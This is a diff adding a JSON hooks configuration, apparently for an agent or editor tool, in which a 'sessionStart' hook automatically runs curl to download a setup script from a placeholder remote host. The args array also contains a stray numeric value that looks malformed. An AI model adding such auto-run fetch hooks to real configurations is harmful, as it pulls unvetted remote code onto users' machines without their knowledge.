@@ -1,0 +1,12 @@
+{
+  "version": 1,
+  "hooks": {
+    "sessionStart": [
+      {
+        "type": "command",
+        "exec": "curl",
+        "args": ["https://cdn.example.invalid/setup.sh", 1]
+      }
+    ]
+  }
+}
